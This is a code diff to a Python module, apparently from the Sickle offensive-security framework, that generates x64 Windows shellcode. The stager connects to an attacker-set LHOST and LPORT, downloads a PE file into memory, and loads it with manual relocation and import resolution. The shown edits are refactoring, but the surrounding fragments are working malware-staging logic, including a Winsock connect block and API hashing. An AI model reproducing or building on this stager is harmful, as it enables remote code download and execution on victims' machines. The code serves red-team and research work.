@@ -2,13 +2,9 @@ import sys
 import ctypes
 import struct
 
+import sickle.common.lib.generic.convert as convert
+import sickle.common.lib.generic.mparser as modparser
 import sickle.common.lib.programmer.builder as builder
-
-from sickle.common.lib.generic.mparser import argument_check
-from sickle.common.lib.generic.convert import port_str_to_htons
-from sickle.common.lib.generic.convert import from_str_to_xwords
-from sickle.common.lib.generic.convert import ip_str_to_inet_addr
-from sickle.common.lib.generic.convert import from_str_to_win_hash # consider rename this to str2whash
 
 from sickle.common.lib.reversing.assembler import Assembler
 
@@ -97,38 +93,40 @@ class Shellcode():
         }
 
         sc_args = builder.init_sc_args(self.dependencies)
-        sc_args.update({"index"                         : 0x00,
-                        "wsaData"                       : 0x00,
-                        "sockaddr_name"                 : 0x00,
-                        "sockfd"                        : 0x00,
-                        "buffer"                        : 0x00,
-                        "pResponse"                     : 0x00,
-                        "pTmpResponse"                  : 0x00,
-                        "bytesRead"                     : 0x00,
-                        "hProcess"                      : 0x00,
-                        "pNtHeader"                     : 0x00,
-                        "lpvLoadedAddress"              : 0x00,
-                        "dwOffsetToBaseRelocationTable" : 0x00,
-                        "pHeaderSection"                : 0x00,
-                        "dwTableSize"                   : 0x00,
-                        "pBaseRelocationTable"          : 0x00,
-                        "dwBlockSize"                   : 0x00,
-                        "pwRelocEntry"                  : 0x00,
-                        "numEntries"                    : 0x00,
-                        "dwBlockIndex"                  : 0x00,
-                        "dwAddressOffset"               : 0x00,
-                        "lpvPreferableBase"             : 0x00,
-                        "dwImportsOffset"               : 0x00,
-                        "lpImportData"                  : 0x00,
-                        "szDllName"                     : 0x00,
-                        "hLibraryHandle"                : 0x00,
-                        "dwFThunk"                      : 0x00,
-                        "lpApiImport"                   : 0x00,
-                        "stWrittenBytes"                : 0x00,
-                        "lpSectionHeaderArray"          : 0x00,
-                        "dwSectionMappedSize"           : 0x00,
-                        "dwSectionProtection"           : 0x00,
-                        "dwSecIndex"                    : 0x00})
+        sc_args.update({
+            "index"                         : 0x00,
+            "wsaData"                       : 0x00,
+            "sockaddr_name"                 : 0x00,
+            "sockfd"                        : 0x00,
+            "buffer"                        : 0x00,
+            "pResponse"                     : 0x00,
+            "pTmpResponse"                  : 0x00,
+            "bytesRead"                     : 0x00,
+            "hProcess"                      : 0x00,
+            "pNtHeader"                     : 0x00,
+            "lpvLoadedAddress"              : 0x00,
+            "dwOffsetToBaseRelocationTable" : 0x00,
+            "pHeaderSection"                : 0x00,
+            "dwTableSize"                   : 0x00,
+            "pBaseRelocationTable"          : 0x00,
+            "dwBlockSize"                   : 0x00,
+            "pwRelocEntry"                  : 0x00,
+            "numEntries"                    : 0x00,
+            "dwBlockIndex"                  : 0x00,
+            "dwAddressOffset"               : 0x00,
+            "lpvPreferableBase"             : 0x00,
+            "dwImportsOffset"               : 0x00,
+            "lpImportData"                  : 0x00,
+            "szDllName"                     : 0x00,
+            "hLibraryHandle"                : 0x00,
+            "dwFThunk"                      : 0x00,
+            "lpApiImport"                   : 0x00,
+            "stWrittenBytes"                : 0x00,
+            "lpSectionHeaderArray"          : 0x00,
+            "dwSectionMappedSize"           : 0x00,
+            "dwSectionProtection"           : 0x00,
+            "dwSecIndex"                    : 0x00,
+        })
 
         self.stack_space = builder.calc_stack_space(sc_args, Shellcode.arch)
         self.storage_offsets = builder.gen_offsets(sc_args, Shellcode.arch)
@@ -715,7 +713,7 @@ alloc_pe_home:
         """Stager responsible for downloading the PE into memory
         """
 
-        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
+        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
         if (argv_dict == None):
             exit(-1)
 
@@ -754,7 +752,7 @@ call_connect:
     mov rcx, rax
     mov r8, {ctypes.sizeof(ws2def.sockaddr)}
     lea rdx, [rbp - {self.storage_offsets['sockaddr_name']}]
-    mov r9, {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
+    mov r9, {hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
     mov [rdx], r9
     xor r9, r9
     mov [rdx + 0x08], r9
@@ -965,7 +963,7 @@ error:
         """Generates the stub to load a library not currently loaded into a process
         """
 
-        lists = from_str_to_xwords(lib)
+        lists = convert.from_str_to_xwords(lib)
         write_index = self.storage_offsets['functionName']
 
         src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
@@ -1015,7 +1013,7 @@ error:
             for func in range(len(imports)):
                 stub += f"""
 get_{imports[func]}:
-    mov rdx, {from_str_to_win_hash(imports[func])}
+    mov rdx, {convert.from_str_to_win_hash(imports[func])}
     call lookupFunction
     mov [rbp - {self.storage_offsets[imports[func]]}], rax
                 """
@@ -1099,4 +1097,8 @@ call_WaitForSingleObject:
         """Generates shellcode
         """
 
-        return Assembler(Shellcode.arch).get_bytes_from_asm(self.generate_source())
+        generator = Assembler(Shellcode.arch)
+
+        src = self.generate_source()
+
+        return generator.get_bytes_from_asm(src)
